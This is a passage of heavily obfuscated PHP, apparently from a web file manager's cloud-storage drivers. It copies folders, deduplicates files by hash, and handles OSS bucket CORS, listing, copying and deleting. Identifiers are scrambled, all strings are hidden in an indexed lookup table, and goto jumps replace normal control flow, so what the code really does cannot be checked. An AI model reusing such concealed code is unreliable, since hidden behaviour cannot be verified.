cÔÆà§ˆÓİ; b¯¨î—¬éï: foreach ($cÔï®ª§ as $f¥õ’È‚‚Å) { $a°˜Œ‹„“ = $Bàá†ŞˆÙ[$f¥õ’È‚‚Å[$eèóÔá÷ò[28]]]; $f —î°½ë› = $a°˜Œ‹„“[$eèóÔá÷ò[399]]; $this->_copyApplyMeta($a°˜Œ‹„“, $AàÎÌ¦¼ŸÌ); if ($f¥õ’È‚‚Å[$eèóÔá÷ò[29]] == $eèóÔá÷ò[86]) { $f¥õ’È‚‚Å[$eèóÔá÷ò[85]] = $e±·ˆ’†«ç->getPathInner($f¥õ’È‚‚Å[$eèóÔá÷ò[85]]); $this->_copyChildTo($e±·ˆ’†«ç, $f¥õ’È‚‚Å[$eèóÔá÷ò[85]], $f —î°½ë›, $cåƒïÏ¹¬, $AàÎÌ¦¼ŸÌ, $dâ›å² ô); } } goto cÒÂ™š©Î; D‚ô‘êĞ±»: $f½ùÈ’òÙ´ = array(); foreach ($cÔï®ª§ as &$f¥õ’È‚‚Å) { goto bÑÅŠæõ†İ; bÑÅŠæõ†İ: if (isset($Fğ¹•¦êô˜[$f¥õ’È‚‚Å[$eèóÔá÷ò[28]]])) { $f¥õ’È‚‚Å = $Fğ¹•¦êô˜[$f¥õ’È‚‚Å[$eèóÔá÷ò[28]]]; } $f¥õ’È‚‚Å[$eèóÔá÷ò[406]] = $f¥õ’È‚‚Å[$eèóÔá÷ò[29]] == $eèóÔá÷ò[86]; $f¥õ’È‚‚Å[$eèóÔá÷ò[408]] = _get($f¥õ’È‚‚Å, $eèóÔá÷ò[177], $eèóÔá÷ò[33]); goto Då÷¯¢¸‰¿; Då÷¯¢¸‰¿: $f¥õ’È‚‚Å[$eèóÔá÷ò[87]] = _get($f¥õ’È‚‚Å, $eèóÔá÷ò[87], 0); $f¥õ’È‚‚Å[$eèóÔá÷ò[450]] = _get($f¥õ’È‚‚Å, $eèóÔá÷ò[450], 0); if (!isset($f¥õ’È‚‚Å[$eèóÔá÷ò[572]]) && $f¥õ’È‚‚Å[$eèóÔá÷ò[450]]) { $AàÎÌ¦¼ŸÌ[$eèóÔá÷ò[569]][] = $f¥õ’È‚‚Å[$eèóÔá÷ò[450]]; } goto F‘Ìë„¶Êç; F‘Ìë„¶Êç: if ($cåƒïÏ¹¬) { $c¤Å¼ĞåÃ = $this->fileNameExistCache($D²¥°ñøÌ˜, $f¥õ’È‚‚Å[$eèóÔá÷ò[28]]); if ($c¤Å¼ĞåÃ) { if ($f¥õ’È‚‚Å[$eèóÔá÷ò[406]] || $cåƒïÏ¹¬ == REPEAT_SKIP) { continue; } if ($cåƒïÏ¹¬ == REPEAT_REPLACE) { $a°˜Œ‹„“ = $this->sourceInfoCache($c¤Å¼ĞåÃ); $fÍ½À¹¾Í‹ = $this->fileHistory($a°˜Œ‹„“, $f¥õ’È‚‚Å[$eèóÔá÷ò[450]], $f¥õ’È‚‚Å[$eèóÔá÷ò[87]]); if ($fÍ½À¹¾Í‹) { $AàÎÌ¦¼ŸÌ[$eèóÔá÷ò[533]][] = $f¥õ’È‚‚Å[$eèóÔá÷ò[450]]; } continue; } else { if ($cåƒïÏ¹¬ == REPEAT_RENAME) { $f¥õ’È‚‚Å[$eèóÔá÷ò[28]] = $this->fileNameAutoCache($D²¥°ñøÌ˜, $f¥õ’È‚‚Å[$eèóÔá÷ò[28]], $cåƒïÏ¹¬, !1); } } } } if (!$f¥õ’È‚‚Å[$eèóÔá÷ò[406]] && $f¥õ’È‚‚Å[$eèóÔá÷ò[450]]) { $AàÎÌ¦¼ŸÌ[$eèóÔá÷ò[533]][] = $f¥õ’È‚‚Å[$eèóÔá÷ò[450]]; } $f½ùÈ’òÙ´[] = $this->_makeItemData($f¥õ’È‚‚Å, $b‘‘¿¦µƒÔ, $f¥õ’È‚‚Å[$eèóÔá÷ò[28]]); goto D¡ÕÍ„¨Ï´; D¡ÕÍ„¨Ï´: } unset($f¥õ’È‚‚Å); goto BĞëä±ÜÔ•; C¶ö´‰¦âˆ: $AàÉ¬¥à = $AàÉ¬¥à ? $AàÉ¬¥à : array($eèóÔá÷ò[83] => array(), $eèóÔá÷ò[84] => array()); $cÔï®ª§ = array_merge($AàÉ¬¥à[$eèóÔá÷ò[83]], $AàÉ¬¥à[$eèóÔá÷ò[84]]); $Fğ¹•¦êô˜ = $this->_addFiles($e±·ˆ’†«ç, $AàÉ¬¥à[$eèóÔá÷ò[83]], $dâ›å² ô); goto D‚ô‘êĞ±»; BĞëä±ÜÔ•: if (!empty($f½ùÈ’òÙ´)) { $this->addAll($f½ùÈ’òÙ´); $this->_childrenListSelect($D²¥°ñøÌ˜); } $Bàá†ŞˆÙ = $this->_childrenList($D²¥°ñøÌ˜); $Bàá†ŞˆÙ = array_to_keyvalue($Bàá†ŞˆÙ, $eèóÔá÷ò[28]); goto b¯¨î—¬éï; cÔÆà§ˆÓİ: $eèóÔá÷ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b‘‘¿¦µƒÔ = $this->sourceInfoCache($D²¥°ñøÌ˜); $AàÉ¬¥à = $e±·ˆ’†«ç->listPath($déùŠ’ô¡); goto C¶ö´‰¦âˆ; cÒÂ™š©Î: } private function _addFiles($eÏ¤âˆÌÌ¢, $DáŠ ·ÚØ÷, $dªÁÍß œ) { goto B§¶‚Òµ‰; Fí¦êÅ»Î’: $eà¶«¤ø„å = Model($AŒÏƒ°Û¦ğ[575]); $a¾ØÌƒƒµó = $eà¶«¤ø„å->where($fˆÊÚÎ® Ğ)->select(); $a¾ØÌƒƒµó = $a¾ØÌƒƒµó ? $a¾ØÌƒƒµó : array(); goto c²›¦î‹®Ä; EˆÉ¦£—â‹: foreach ($DáŠ ·ÚØ÷ as $aøéÈ¶–É) { $e¶‰Çæ’‰ö[$aøéÈ¶–É[$AŒÏƒ°Û¦ğ[28]]] = $aøéÈ¶–É; } return $e¶‰Çæ’‰ö; goto cÜ¨ŒÑ‚´; Fõæãá™²: $eà¶«¤ø„å->addAll($B¤æ§‚Ê£); $fˆÊÚÎ® Ğ = array($AŒÏƒ°Û¦ğ[179] => array($AŒÏƒ°Û¦ğ[7], array_keys($f…ïöÜÉƒ¶))); $a¾ØÌƒƒµó = $eà¶«¤ø„å->where($fˆÊÚÎ® Ğ)->select(); goto FÂÁ®§†Úë; D”›ø÷œÇ: foreach ($DáŠ ·ÚØ÷ as &$cù¢¥ÄÃñ‘) { goto cˆåØ¥ÆÓ; fì• ÊàÑæ: $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[179]] = $dŒ—Àèà¥º; Hook::trigger($AŒÏƒ°Û¦ğ[574], $cù¢¥ÄÃñ‘); $f…ïöÜÉƒ¶[$dŒ—Àèà¥º][] =& $cù¢¥ÄÃñ‘; goto E§” êÕ¼; cˆåØ¥ÆÓ: Hook::trigger($AŒÏƒ°Û¦ğ[573], $cù¢¥ÄÃñ‘); $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[85]] = $eÏ¤âˆÌÌ¢->getPathInner($cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[85]]); $C‘Ñ”ğí¦µ = $eÏ¤âˆÌÌ¢->hashSimple($cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[85]]); goto E‰¡…°·£; E‰¡…°·£: $dŒ—Àèà¥º = $eÏ¤âˆÌÌ¢->hashMd5($cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[85]]); if (strlen($dŒ—Àèà¥º) > 10 && !isset($f…ïöÜÉƒ¶[$dŒ—Àèà¥º])) { $f…ïöÜÉƒ¶[$dŒ—Àèà¥º] = array(); } $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[180]] = $C‘Ñ”ğí¦µ; goto fì• ÊàÑæ; E§” êÕ¼: if (count($f…ïöÜÉƒ¶[$dŒ—Àèà¥º]) > 1) { $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[572]] = !0; } goto Cï®æŞÏÕŠ; Cï®æŞÏÕŠ: } unset($cù¢¥ÄÃñ‘); $fˆÊÚÎ® Ğ = array($AŒÏƒ°Û¦ğ[179] => array($AŒÏƒ°Û¦ğ[7], array_keys($f…ïöÜÉƒ¶))); goto Fí¦êÅ»Î’; c²›¦î‹®Ä: foreach ($a¾ØÌƒƒµó as $e”ÓË‘‹Î) { if (!isset($f…ïöÜÉƒ¶[$e”ÓË‘‹Î[$AŒÏƒ°Û¦ğ[179]]])) { continue; } $dŠà¥ÏÆÅ = $f…ïöÜÉƒ¶[$e”ÓË‘‹Î[$AŒÏƒ°Û¦ğ[179]]]; foreach ($dŠà¥ÏÆÅ as &$cù¢¥ÄÃñ‘) { $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[450]] = $e”ÓË‘‹Î[$AŒÏƒ°Û¦ğ[450]]; $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[572]] = !0; } unset($cù¢¥ÄÃñ‘); } $B¤æ§‚Ê£ = array(); foreach ($DáŠ ·ÚØ÷ as $b½ÕÂµÈ‡ã) { if (isset($b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[572]]) && $b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[572]]) { continue; } $bÌÎŸ•æ—ª = $eÏ¤âˆÌÌ¢->getPathInner($b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[85]]); $DŸ¯¾Âè¡… = $eà¶«¤ø„å->addFileMake($bÌÎŸ•æ—ª, $b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[87]], $b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[180]], $b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[179]], $b½ÕÂµÈ‡ã[$AŒÏƒ°Û¦ğ[28]], $dªÁÍß œ); $B¤æ§‚Ê£[] = $DŸ¯¾Âè¡…; } goto Fõæãá™²; B§¶‚Òµ‰: $AŒÏƒ°Û¦ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$DáŠ ·ÚØ÷ || count($DáŠ ·ÚØ÷) == 0) { return array(); } $f…ïöÜÉƒ¶ = array(); goto D”›ø÷œÇ; FÂÁ®§†Úë: $a¾ØÌƒƒµó = $a¾ØÌƒƒµó ? $a¾ØÌƒƒµó : array(); foreach ($a¾ØÌƒƒµó as $e”ÓË‘‹Î) { if (!isset($f…ïöÜÉƒ¶[$e”ÓË‘‹Î[$AŒÏƒ°Û¦ğ[179]]])) { continue; } $bìÉœ„È»Ğ =& $f…ïöÜÉƒ¶[$e”ÓË‘‹Î[$AŒÏƒ°Û¦ğ[179]]]; foreach ($bìÉœ„È»Ğ as &$cù¢¥ÄÃñ‘) { $cù¢¥ÄÃñ‘[$AŒÏƒ°Û¦ğ[450]] = $e”ÓË‘‹Î[$AŒÏƒ°Û¦ğ[450]]; } unset($cù¢¥ÄÃñ‘); } $e¶‰Çæ’‰ö = array(); goto EˆÉ¦£—â‹; cÜ¨ŒÑ‚´: } } goto Dãææ²Îôä; B‘ÔØ£ˆÍ¾: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D‡Û’²âö†) { parent::__construct($D‡Û’²âö†); $this->signatureVersion($_SERVER[í¤âËÚ£¶íÊ¢][220]); } public function fileOutLink($d°Æ×¶äİ) { $e®šËÀÑ¾è =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (substr($d°Æ×¶äİ, 0, 7) == $e®šËÀÑ¾è[1162]) { $d°Æ×¶äİ = $e®šËÀÑ¾è[1163] . substr($d°Æ×¶äİ, 7); } header($e®šËÀÑ¾è[168] . $d°Æ×¶äİ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Fæ”Ÿ…»ˆœ) { parent::__construct(); include_once SDK_DIR . $_SERVER[í¤âËÚ£¶íÊ¢][1219]; $this->_init($Fæ”Ÿ…»ˆœ); } public function _init($F¦ÁËÙŸ—) { $aÖ°Š¬™¾× =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($F¦ÁËÙŸ— as $d½¢áè¿÷— => $b—ìÎ¬Ò‡¤) { if (isset($this->{$d½¢áè¿÷—})) { $this->{$d½¢áè¿÷—} = $b—ìÎ¬Ò‡¤; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($aÖ°Š¬™¾×[1220] . LNG($aÖ°Š¬™¾×[1221])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto D“±¢‚„ğ»; a…âºš½Ë: $a·ßæŒ¹î‹->addRule($fË¸Ëµâšä); try { $this->client->putBucketCors($this->bucket, $a·ßæŒ¹î‹); } catch (OSS\Core\OssException $cÇÀ£è„Ş§) { return !1; } return !0; goto CøõÔ¬’“; D“±¢‚„ğ»: $cêãÖ„‹Ãô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a·ßæŒ¹î‹ = new OSS\Model\CorsConfig(); $fË¸Ëµâšä = new OSS\Model\CorsRule(); goto eìŒµŒÆù; a´‹»åˆß: $fË¸Ëµâšä->addAllowedMethod($cêãÖ„‹Ãô[1225]); $fË¸Ëµâšä->addAllowedMethod($cêãÖ„‹Ãô[1226]); $fË¸Ëµâšä->addAllowedMethod($cêãÖ„‹Ãô[167]); goto d…³ùƒ; eìŒµŒÆù: $fË¸Ëµâšä->addAllowedOrigin($cêãÖ„‹Ãô[1222]); $fË¸Ëµâšä->addAllowedMethod($cêãÖ„‹Ãô[1223]); $fË¸Ëµâšä->addAllowedMethod($cêãÖ„‹Ãô[1224]); goto a´‹»åˆß; d…³ùƒ: $fË¸Ëµâšä->setMaxAgeSeconds(600); $fË¸Ëµâšä->addExposeHeader($cêãÖ„‹Ãô[1227]); $fË¸Ëµâšä->addAllowedHeader($cêãÖ„‹Ãô[1222]); goto a…âºš½Ë; CøõÔ¬’“: } public function getBucketCors() { goto f›ä®öì½œ; f¸Ëå©ÅÒà: return array($CèêˆáğÁ‘[190] => isset($fâÈ©¸œÚ¶[0]) ? $fâÈ©¸œÚ¶[0] : $CèêˆáğÁ‘[33], $CèêˆáğÁ‘[194] => $bËñˆŞÃ£É, $CèêˆáğÁ‘[1228] => $Eœ‚Ğ¯‹Å×, $CèêˆáğÁ‘[1229] => isset($cÔŠ’ˆ²ä–[0]) ? $cÔŠ’ˆ²ä–[0] : $CèêˆáğÁ‘[33], $CèêˆáğÁ‘[192] => isset($Eºñˆ‰”Ö´[0]) ? $Eºñˆ‰”Ö´[0] : $CèêˆáğÁ‘[33]); goto F”µ¿¸Óœã; AªÏ¬°¡Ø: if (!$a˜³´ß†ãÎ || !($Dù¨”“Âïæ = $a˜³´ß†ãÎ->getRules())) { return null; } $fâÈ©¸œÚ¶ = $Dù¨”“Âïæ[0]->getAllowedOrigins(); $bËñˆŞÃ£É = $Dù¨”“Âïæ[0]->getAllowedMethods(); goto CãÌßİÀ¶Ş; CãÌßİÀ¶Ş: $Eœ‚Ğ¯‹Å× = $Dù¨”“Âïæ[0]->getMaxAgeSeconds(); $cÔŠ’ˆ²ä– = $Dù¨”“Âïæ[0]->getExposeHeaders(); $Eºñˆ‰”Ö´ = $Dù¨”“Âïæ[0]->getAllowedHeaders(); goto f¸Ëå©ÅÒà; f›ä®öì½œ: $CèêˆáğÁ‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a˜³´ß†ãÎ = null; try { $a˜³´ß†ãÎ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A¾ÃŸª”Ş÷) { return null; } goto AªÏ¬°¡Ø; F”µ¿¸Óœã: } public function isBucketCors() { goto Bğëî¹Ç¹; CÆËÉÅ•¾ê: if ($cÎºÇ²ºÍ›[$dÚô‚³’çá[190]] != $dÚô‚³’çá[191] || $cÎºÇ²ºÍ›[$dÚô‚³’çá[192]] != $dÚô‚³’çá[191]) { return !1; } $d¹Ñ•åãÏƒ = array_map($dÚô‚³’çá[193], $cÎºÇ²ºÍ›[$dÚô‚³’çá[194]]); if (!is_array($d¹Ñ•åãÏƒ)) { $d¹Ñ•åãÏƒ = array(); } goto d”ôÛÈ®™ò; d”ôÛÈ®™ò: $c¹Ø¸´›– = array($dÚô‚³’çá[195], $dÚô‚³’çá[196], $dÚô‚³’çá[197], $dÚô‚³’çá[198], $dÚô‚³’çá[199]); $Cæ‰øØ– = array_diff($c¹Ø¸´›–, $d¹Ñ•åãÏƒ); return empty($Cæ‰øØ–); goto dğÉéê; Bğëî¹Ç¹: $dÚô‚³’çá =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÎºÇ²ºÍ› = $this->getBucketCors(); if (!$cÎºÇ²ºÍ› || !is_array($cÎºÇ²ºÍ›)) { return !1; } goto CÆËÉÅ•¾ê; dğÉéê: } public function mkfile($bæŞ‡­¯, $a¤“ ¯èî½ = '', $a¢Ê»ÑÔ÷Å = REPEAT_RENAME) { $bŒ†™Æ›è = $this->setContent($bæŞ‡­¯, $a¤“ ¯èî½); if ($bŒ†™Æ›è !== !1) { return $this->getPathOuter($bæŞ‡­¯); } return !1; } public function mkdir($b’÷£Şƒõ, $D©ŠŸéÃ¯¼ = REPEAT_SKIP) { if ($this->_isFolder($b’÷£Şƒõ)) { return $this->getPathOuter($b’÷£Şƒõ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($b’÷£Şƒõ)); } catch (OSS\Core\OssException $FËœÛÊÏ¡Á) { return !1; } return $this->getPathOuter($b’÷£Şƒõ); } private function fileList($F“ĞÂµÅ½, $BŠá˜Í¾„ = '', $bÌ³äù¸•ç = 0) { goto bòÖ·–Ñ; d—†•±éË©: $FÉæ—Ì¨ª¡ = $dË½¾¢Î[33]; $c£ÍÅĞˆî = 1000; $EÜÙ¢ÊÏÍ = $this->listItemCache === !1 ? !1 : !0; goto Cô’½¢ÀÏê; Cô’½¢ÀÏê: $D›İ†ê‡ƒ© = $EïˆêÜ¿Êé = array(); while (!0) { check_abort(); $D×¶òØ¡ £ = array($dË½¾¢Î[1230] => $BŠá˜Í¾„, $dË½¾¢Î[1231] => $c½×‹ã”ñ, $dË½¾¢Î[1232] => $c£ÍÅĞˆî, $dË½¾¢Î[1233] => $FÉæ—Ì¨ª¡); try { $F¹Â¨¾³« = $this->client->listObjects($this->bucket, $D×¶òØ¡ £); } catch (OSS\Core\OssException $D”¶³ö‡ÓŠ) { break; } $FÉæ—Ì¨ª¡ = $F¹Â¨¾³«->getNextMarker(); $AŒ®§™ø·± = $F¹Â¨¾³«->getObjectList(); $e¿ê„ñ˜Ó = $F¹Â¨¾³«->getPrefixList(); foreach ($AŒ®§™ø·± as $EÛÒÎƒ÷Ûø) { goto Cìº’ôÎÛë; Cìº’ôÎÛë: if ($EÛÒÎƒ÷Ûø->getKey() == $c½×‹ã”ñ) { continue; } $C¥ó´ÛÕø› = $EÛÒÎƒ÷Ûø->getKey(); $dì»ŒôËÃó = $EÛÒÎƒ÷Ûø->getSize(); goto bÖ¢Êƒäİå; A¸‹ëÇßÄ: if ($EÜÙ¢ÊÏÍ) { $this->cacheMethod($dË½¾¢Î[207], $C¥ó´ÛÕø›, $F©ƒíÓÎŠÀ); $this->cacheMethod($dË½¾¢Î[208], $C¥ó´ÛÕø›, array($dË½¾¢Î[87] => $dì»ŒôËÃó, $dË½¾¢Î[1234] => $dì»ŒôËÃó, $dË½¾¢Î[93] => strtotime($d¶éÃ ¾İæ), $dË½¾¢Î[1235] => $d¶éÃ ¾İæ)); } if ($F©ƒíÓÎŠÀ) { $D›İ†ê‡ƒ©[] = $C¥ó´ÛÕø›; continue; } $EïˆêÜ¿Êé[] = $d½™À¹˜ºå; goto eÒ·ğáæ‘; bÖ¢Êƒäİå: $d¶éÃ ¾İæ = $EÛÒÎƒ÷Ûø->getLastModified(); $d½™À¹˜ºå = $bÌ³äù¸•ç ? array($dË½¾¢Î[28] => $C¥ó´ÛÕø›, $dË½¾¢Î[87] => $dì»ŒôËÃó, $dË½¾¢Î[205] => strtotime($d¶éÃ ¾İæ)) : $C¥ó´ÛÕø›; $F©ƒíÓÎŠÀ = $dì»ŒôËÃó == 0 && substr($C¥ó´ÛÕø›, strlen($C¥ó´ÛÕø›) - 1, 1) == $dË½¾¢Î[8] ? !0 : !1; goto A¸‹ëÇßÄ; eÒ·ğáæ‘: } foreach ($e¿ê„ñ˜Ó as $B‘Å†Ø×”Ï) { $D›İ†ê‡ƒ©[] = $B‘Å†Ø×”Ï->getPrefix(); if ($EÜÙ¢ÊÏÍ) { $this->cacheMethod($dË½¾¢Î[207], $C¥ó´ÛÕø›, !0); } } if ($FÉæ—Ì¨ª¡ === $dË½¾¢Î[33]) { break; } } if ($EÜÙ¢ÊÏÍ) { $this->cacheMethod($dË½¾¢Î[207], $F“ĞÂµÅ½, !0); } goto B³¼Ë¿—; B³¼Ë¿—: return array($dË½¾¢Î[84] => $D›İ†ê‡ƒ©, $dË½¾¢Î[83] => $EïˆêÜ¿Êé); goto dß«Ü•Ò¬á; bòÖ·–Ñ: $dË½¾¢Î =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F“ĞÂµÅ½ = trim($F“ĞÂµÅ½, $dË½¾¢Î[8]); $c½×‹ã”ñ = empty($F“ĞÂµÅ½) ? $dË½¾¢Î[33] : $F“ĞÂµÅ½ . $dË½¾¢Î[8]; goto d—†•±éË©; dß«Ü•Ò¬á: } public function copyFile($EõŒ†ÒÆĞ, $fçäêùÄÅ‡) { $dƒÇ£áè¢Ÿ = $this->size($EõŒ†ÒÆĞ); if ($dƒÇ£áè¢Ÿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $EõŒ†ÒÆĞ, $this->bucket, $this->pathEncode($fçäêùÄÅ‡)); } catch (OSS\Core\OssException $D¢µµ˜‰Š) { return !1; } return $this->getPathOuter($fçäêùÄÅ‡); } $FÀ±Åïœ¡š = $this->multiCopyObject($EõŒ†ÒÆĞ, $fçäêùÄÅ‡, $dƒÇ£áè¢Ÿ); return $FÀ±Åïœ¡š ? $this->getPathOuter($fçäêùÄÅ‡) : !1; } private function multiCopyObject($e•ì¦ğÂÆ, $c‡í®âÆå, $c‚ê«ƒù×è) { $D‡¼‚·‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; try { goto BÍ¡¡‚ÉŒÊ; EƒñÑ‰Á‡­: $DµÊŒƒ–œ = array(); foreach ($d ˆ¸ÁÛÎ as $Dáéª°ÚÛˆ => $FÈ‡˜¼À—©) { $DµÊŒƒ–œ[] = array($D‡¼‚·‡[1240] => $Dáéª°ÚÛˆ + 1, $D‡¼‚·‡[1241] => $FÈ‡˜¼À—©); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($c‡í®âÆå), $DÌïùĞ÷Îä, $DµÊŒƒ–œ); goto Bà§»Õ¨š; bÓìÏáÈ§‡: $b·´ƒŠèµ = 1; $D†äÜìÖÜ = 0; $d ˆ¸ÁÛÎ = array(); goto AÓ‡‰ÜŠÈ®; AÓ‡‰ÜŠÈ®: $d‚Ó¥Ÿ±£˜ = 1024 * 1024 * 10; $AÒ•’âÜ¯± = $this->client->generateMultiuploadParts($c‚ê«ƒù×è, $d‚Ó¥Ÿ±£˜); foreach ($AÒ•’âÜ¯± as $Dáéª°ÚÛˆ => $d§òÔ²¹ƒó) { $Aˆá„©·îœ = $D†äÜìÖÜ + (int) $d§òÔ²¹ƒó[$D‡¼‚·‡[1237]]; $bÇ¾°Ä÷ = (int) $d§òÔ²¹ƒó[$D‡¼‚·‡[342]] + $Aˆá„©·îœ - 1; $Fâ£İ®¨çÇ = array($D‡¼‚·‡[1238] => $Aˆá„©·îœ, $D‡¼‚·‡[1239] => $bÇ¾°Ä÷); $d ˆ¸ÁÛÎ[] = $this->client->uploadPartCopy($this->bucket, $e•ì¦ğÂÆ, $this->bucket, $this->pathEncode($c‡í®âÆå), $b·´ƒŠèµ, $DÌïùĞ÷Îä, $Fâ£İ®¨çÇ); $b·´ƒŠèµ = $b·´ƒŠèµ + 1; } goto EƒñÑ‰Á‡­; BÍ¡¡‚ÉŒÊ: $fŒèâÄ‘„ = array(); if ($fï¥ÉÚÊÛ = $this->hashMd5($e•ì¦ğÂÆ)) { $fŒèâÄ‘„ = array(OSS\OssClient::OSS_HEADERS => array($D‡¼‚·‡[1236] => $fï¥ÉÚÊÛ)); } $DÌïùĞ÷Îä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($c‡í®âÆå), $fŒèâÄ‘„); goto bÓìÏáÈ§‡; Bà§»Õ¨š: } catch (OSS\Core\OssException $Eï¥æğ±Äó) { return !1; } return !0; } public function moveFile($AÇáªÉÎ©“, $C¼õÅìÍÈ) { if ($this->copyFile($AÇáªÉÎ©“, $C¼õÅìÍÈ)) { $this->remove($AÇáªÉÎ©“); return $this->getPathOuter($C¼õÅìÍÈ); } return !1; } public function delFile($eäã Í¥ğ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($eäã Í¥ğ)); } catch (OSS\Core\OssException $f©£î¹›œ) { return !1; } return !0; } public function delFolder($CÆÅÁÇÄ) { goto f½Ø¥ÃÃ; AË„ÎàÈò: if (!empty($CÆÅÁÇÄ) && !in_array($a¿Õ¼¿•¸¯, $bêçšâÀÉ¢[$AĞªñÂ¾ªŞ[84]])) { $bêçšâÀÉ¢[$AĞªñÂ¾ªŞ[84]][] = $a¿Õ¼¿•¸¯; } $a–ó’–éä = $this->delByBatch($bêçšâÀÉ¢[$AĞªñÂ¾ªŞ[83]]); if (!$a–ó’–éä) { return !1; } goto aô‡ğ‹Šù¯; aô‡ğ‹Šù¯: return $this->delByBatch($bêçšâÀÉ¢[$AĞªñÂ¾ªŞ[84]]); goto Eƒ¹æô³°Î; C¥ííõõµ»: $bêçšâÀÉ¢ = $this->fileList($CÆÅÁÇÄ); $this->listItemCache = !0; $a¿Õ¼¿•¸¯ = trim($CÆÅÁÇÄ, $AĞªñÂ¾ªŞ[8]) . $AĞªñÂ¾ªŞ[8]; goto AË„ÎàÈò; f½Ø¥ÃÃ: $AĞªñÂ¾ªŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->exist($CÆÅÁÇÄ)) { return !0; } $this->listItemCache = !1; goto C¥ííõõµ»; Eƒ¹æô³°Î: } private function delByBatch($BÒ¥õ†ĞÖ) { foreach (array_chunk($BÒ¥õ†ĞÖ, 1000) as $CÅ±’•¾¾÷) { try { $this->client->deleteObjects($this->bucket, $CÅ±’•¾¾÷); } catch (OSS\Core\OssException $d¨¡ÁÕ†ê) { return !1; } } return !0; } public function rename($Fğö©œ¹î², $Dèº‰³ª…á) { return $this->renameObject($Fğö©œ¹î², $Dèº‰³ª…á); } private function fileInfo($c½ì³º–¾Î, $C¾ùåßÖ±µ = false, $f‰Ü……¯İ¬ = array()) { goto Cªó¥’ÌâÈ; A´Èƒ¥ÜãË: $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[202]] = $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[93]] = 0; $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[203]] = $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[204]] = !0; if (empty($f‰Ü……¯İ¬)) { $bˆÉ¾¸º› = $this->objectMeta($c½ì³º–¾Î); if (!$bˆÉ¾¸º›) { return $BÆ¶ê¬¯¯Œ; } $f‰Ü……¯İ¬ = array($AÃªİäª½¹[93] => strtotime($bˆÉ¾¸º›[$AÃªİäª½¹[1235]]), $AÃªİäª½¹[87] => $bˆÉ¾¸º›[$AÃªİäª½¹[1234]] + 0); } goto B‡ÉÛ§ÍÛÄ; B‡ÉÛ§ÍÛÄ: if (isset($f‰Ü……¯İ¬[$AÃªİäª½¹[87]])) { $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[87]] = $f‰Ü……¯İ¬[$AÃªİäª½¹[87]]; } if (isset($f‰Ü……¯İ¬[$AÃªİäª½¹[93]])) { $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[93]] = $f‰Ü……¯İ¬[$AÃªİäª½¹[93]]; } if (isset($f‰Ü……¯İ¬[$AÃªİäª½¹[205]]) && !trim($BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[93]])) { $BÆ¶ê¬¯¯Œ[$AÃªİäª½¹[93]] = $f‰Ü……¯İ¬[$AÃªİäª½¹[205]]; } goto Aë²¶µÓÅ—; Cªó¥’ÌâÈ: $AÃªİäª½¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÆ¶ê¬¯¯Œ = array($AÃªİäª½¹[28] => $this->pathThis($c½ì³º–¾Î), $AÃªİäª½¹[85] => $this->getPathOuter($c½ì³º–¾Î), $AÃªİäª½¹[29] => $AÃªİäª½¹[201], $AÃªİäª½¹[87] => isset($f‰Ü……¯İ¬[$AÃªİäª½¹[87]]) ? $f‰Ü……¯İ¬[$AÃªİäª½¹[87]] : 0, $AÃªİäª½¹[177] => $this->ext($c½ì³º–¾Î)); if ($C¾ùåßÖ±µ) { return $BÆ¶ê¬¯¯Œ; } goto A´Èƒ¥ÜãË; Aë²¶µÓÅ—: return $BÆ¶ê¬¯¯Œ; goto B÷ç†„†‹’; B÷ç†„†‹’: } private function folderInfo($d”åˆ‡™Ú, $DĞ®‚ÒÀÆ” = false, $b²ÈÙºŞè = array()) { goto e†Ïîá³À; e†Ïîá³À: $añÕòÈ˜º =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C¹…¢‚à = array($añÕòÈ˜º[28] => $this->pathThis($d”åˆ‡™Ú), 